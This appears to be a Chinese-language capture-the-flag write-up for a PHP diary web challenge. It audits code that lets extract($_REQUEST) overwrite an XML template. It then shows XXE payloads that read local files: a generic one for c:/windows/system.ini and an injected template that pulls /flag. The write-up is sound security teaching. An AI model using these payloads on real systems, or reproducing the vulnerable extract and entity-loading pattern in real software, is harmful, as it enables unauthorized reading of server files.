---
title: hgamemini-TuTu's Diary Book
tags: 
  - xxe注入
description: ISCTF php 一句话木马
---
# hgamemini-TuTu's Diary Book
打开界面，是一个可以输入心情和内容的日记本，通过观察没有任何可以下手的地方，首先我们通过爆破网站目录或者根据经验获取网站源码以进行代码审计。
## 源码获取
这里注意常见的源码文件：
```
1.www.zip
2.www.tar.gz
3.src.zip
4.src.tar.gz
5.www.tar
6./.git/
```
![](./img/Snipaste_2023-12-14_23-18-26.png)
![](./img/Snipaste_2023-12-14_23-19-35.png)

```php
// newdiary.php
<?php
    $diary_template = "<?xml version='1.0' encoding='utf-8'?>
        <diary>
            <date>%s</date>
            <feeling>%s</feeling>
            <content>%s</content>
        </diary>
    ";

    date_default_timezone_set('Asia/Shanghai');
    $system_date = date('Y-m-d H:i:s');
    extract($_REQUEST);
    if(isset($feeling) && isset($content)) {
        if($content == "") {
            echo "⛌ 日记内容不能为空";
            die();
        }
        $diary = sprintf($diary_template, $system_date, $feeling, $content);
        $diary_filename = date('Y-m-d') . ".xml";
        file_put_contents('./diaries/' . $diary_filename, $diary);
        header("Location: /readdiary.php?diary_date=" . date('Y-m-d'));
    } else {
        echo "feeling and content must be set.";
        die();
    }
?>
```
## 代码解析
代码中，会使用`diary_template`作为模板，通过`extract`解析参数，在后面的`sprintf`格式化字符串构造xml文件。如果满足`feeling`和`content`被设置且不为空，则将输入的内容构造成新的xml文件。而在另一个页面`readdiary.php`中，存在解析 xml 文件并从中获取历史日记的代码，并且在该代码中，由于读取文件时使用正则表达式过滤了文件名，我们无法通过这里读取文件来直接获取 flag：
```php
<?php
    extract($_REQUEST);
    if(isset($diary_date)) {
        // Check diary file.
        if(!preg_match('/^([0-9]{4})-([0-9]{2})-([0-9]{2})$/',$diary_date)) {
            echo "invaild diary_date input.";
            die();
        }
        $diary_file = "./diaries/" . $diary_date . ".xml";
        if(!file_exists($diary_file)) {
            echo "†没有这一天的日记†";
            die();
        }
        // The diary file is now vaild. 
        // Read diary file.
        
        $diary_dom = new DOMDocument();
        $diary_dom->loadXML(file_get_contents($diary_file) , LIBXML_NOENT | LIBXML_DTDLOAD);
        $diary = simplexml_import_dom($diary_dom);
    } else {
        echo "diary_date must be set.";
        die();
    }
?>
```
## 漏洞挖掘
通过上述写入 xml 又加载 xml 的过程，我们猜想可能是XXE漏洞。

XXE漏洞的基本场景如下：
```php
<?php

    libxml_disable_entity_loader (false);
    $xmlfile = file_get_contents('php://input');
    $dom = new DOMDocument();
    $dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); 
    $creds = simplexml_import_dom($dom);
    echo $creds;

?>
```
对于上述场景，我们可以构造如下 payload
```xml
<?xml version="1.0" encoding="utf-8"?> 
<!DOCTYPE creds [  
<!ENTITY goodies SYSTEM "file:///c:/windows/system.ini"> ]> 
<creds>&goodies;</creds>
```
即可通过 xxe 注入读取`c:/windows/system.ini`。

在本题中，由于 xml 是预先设定好的模板：
``` php
$diary_template = "<?xml version='1.0' encoding='utf-8'?>
        <diary>
            <date>%s</date>
            <feeling>%s</feeling>
            <content>%s</content>
        </diary>
    ";
```
在该模板中只有三个 `%s` 的地方可以写入内容，而我们的 payload 必须在 diary 标签外定义外部实体从而读外部文件，所以必须想办法修改该 template。
## 漏洞利用
观察代码，发现`extract($_REQUEST);`其中
>extract() 函数从数组中将变量导入到当前的符号表。
该函数使用数组键名作为变量名，使用数组键值作为变量值。针对数组中的每个元素，将在当前符号表中创建对应的一个变量。该函数返回成功设置的变量数目。

例子如下：
```php
<?php
$a = "Original";
$my_array = array("a" => "Cat","b" => "Dog", "c" => "Horse");
extract($my_array);
echo "\$a = $a; \$b = $b; \$c = $c";
?>
```
并且查阅资料，`_REQUEST`是
> 默认情况下包含了 $_GET，$_POST 和 $_COOKIE 的数组。(https://www.php.net/manual/zh/reserved.variables.request.php)

因此我们可以在请求中附加`diary_template`参数，从而利用 extract 的特性修改该变量。

我们在 get 请求中附带`diary_template`参数，将其设置为如下内容，需要注意的是我们需要按原样构建 xml 的结构，必须是完整的 xml 文件，并且包含 diary 根节点和 date、feeling以及 content：
```xml
<?xml version='1.0' encoding='utf-8'?>
<!DOCTYPE content [  
<!ENTITY goodies SYSTEM "file:///flag"> ]> 
    <diary>
        <date>%s</date> 
        <feeling>%s</feeling>
        <content>%s</content>
    </diary>
```

![](./img/Snipaste_2023-12-15_17-55-40.png)
该请求 发送至 newdiary.php 被`extract`函数解析后，以覆盖的`diary_template`写入得到 xml 文件中，进而在 readdiary.php 中被重新加载，触发漏洞，获取将 flag 的内容，将 flag 作为 content 从而显示。

## 写在后面
注意几个经常遗忘的点或者比较重要的点：
- isset函数：用于检测变量是否已设置并且非 NULL。
- extract函数:可以传入数组中的键值对从而修改原变量的值或创建新变量赋并初值。
- 关于访问文件：文件名可以依次尝试`flag`,`flag.txt`,`flag.php`(根据题目)
- 路径：./代表当前目录 /代表根目录 ../代表上一层目录